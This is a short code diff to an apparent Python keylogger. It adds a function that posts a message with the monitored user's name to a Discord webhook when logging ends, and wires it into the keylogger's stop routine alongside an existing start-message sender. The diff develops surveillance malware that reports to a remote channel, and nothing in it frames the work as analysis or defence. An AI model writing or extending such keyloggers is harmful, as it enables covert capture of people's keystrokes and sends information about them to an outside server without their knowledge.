@@ -92,6 +92,7 @@ def stop_keylogger():
     print('Desired key combination detected. Stopping keylogger...')
     if log_timer:
         log_timer.cancel()
+    send_end_message()
     listener.stop()
     sys.exit(0)
 
@@ -144,6 +145,18 @@ def send_start_message():
             start_message_sent = True
         else:
             print(f'Failed to send start message. Status code: {response.status_code}')
+
+# Function to send the end message to Discord
+def send_end_message():
+    end_message = f"{user_name} logging ended"
+    data = {
+        "content": end_message
+    }
+    response = requests.post(webhook_url, json=data)
+    if response.status_code == 200:
+        print('End message sent successfully.')
+    else:
+        print(f'Failed to send end message. Status code: {response.status_code}')
 
 # Send the start message
 send_start_message()
